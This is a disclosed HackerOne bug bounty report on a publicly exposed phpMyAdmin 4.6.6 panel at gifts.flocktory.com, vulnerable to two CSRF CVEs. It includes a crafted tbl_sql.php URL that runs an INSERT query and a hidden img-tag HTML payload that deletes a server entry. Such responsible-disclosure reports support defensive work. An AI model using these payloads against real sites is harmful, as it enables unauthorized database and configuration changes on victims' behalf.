---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1113212'
original_report_id: '1113212'
title: gifts.flocktory.com/phpmyadmin is vulnerable csrf
weakness: Cross-Site Request Forgery (CSRF)
team_handle: qiwi
created_at: '2021-02-28T10:10:41.504Z'
disclosed_at: '2021-04-14T08:36:02.931Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 32
asset_identifier: '*.flocktory.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# gifts.flocktory.com/phpmyadmin is vulnerable csrf

## Metadata

- HackerOne Report ID: 1113212
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: qiwi
- Disclosed At: 2021-04-14T08:36:02.931Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

# Summary:
Hello Team,
I found that the PHPMyAdmin login panel is publicly accessible on https://gifts.flocktory.com and it is using the 4.6.6 version of PHPMyAdmin, which is vulnerable to several CVEs
https://www.cvedetails.com/vulnerability-list/vendor_id-784/product_id-1341/version_id-251928/Phpmyadmin-Phpmyadmin-4.6.6.html
https://www.cybersecurity-help.cz/vdb/phpmyadmin/phpmyadmin/4.6.6/
{F1212091}
Out of which 2 of them are CSRF vulnerability in it.


# Description:
**CVE-2019-12616:**
## Details:
The vulnerability exists due to insufficient validation of the HTTP request origin in "tbl_sql.php" script. A remote attacker can trick the victim to visit a specially crafted web page and perform arbitrary actions on behalf of the victim on the vulnerable website, such as execute arbitrary INSERT or DELETE statements.

## Steps to reproduce/POC:
https://gifts.flocktory.com/tbl_sql.php?sql_query=INSERT+INTO+%60pma__bookmark%60+(%60id%60%2C+%60dbase%60%2C+%60user%60%2C+%60label%60%2C+%60query%60)+VALUES+(DAYOFWEEK(%27%27)%2C+%27%27%2C+%27%27%2C+%27%27%2C+%27%27)&show_query=1&db=phpmyadmin&table=pma__bookmark

An attacker can create a CSRF HTML page using the above URL, and when the victim visits any such page. Then an insert query will be fired created by the attacker

## Impact:
An attacker can perform arbitrary actions on behalf of the victim, such as execute arbitrary INSERT or DELETE statements.

## References:
https://www.cybersecurity-help.cz/vdb/SB2019060501
https://nvd.nist.gov/vuln/detail/CVE-2019-12616


**CVE-2019-12922:**
## Details:
The vulnerability exists due to insufficient validation of the HTTP request origin. A remote attacker can trick the victim to visit a specially crafted web page and perform arbitrary actions on behalf of the victim on the vulnerable website, such as delete an arbitrary server on the Setup page.

## Steps to reproduce/POC:
```html
<p>Deleting Server 1</p>
<img src="
https://gifts.flocktory.com/phpmyadmin/setup/index.php?page=servers&mode=remove&id=1"
style="display:none;" />
```
An attacker can create a CSRF HTML page using the above HTML code, and when the victim visits any such page. Then an server will be deleted with id=1

## Impact:
An attacker can perform arbitrary actions on behalf of the victim, such as delete an arbitrary server on the Setup page.

## References:
https://www.exploit-db.com/exploits/47385
https://nvd.nist.gov/vuln/detail/CVE-2019-12922


Thanks and regards,
@ganofins

## Impact

An attacker can perform arbitrary actions on behalf of the victim, such as execute arbitrary INSERT or DELETE statements, delete an arbitrary server on the Setup page.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
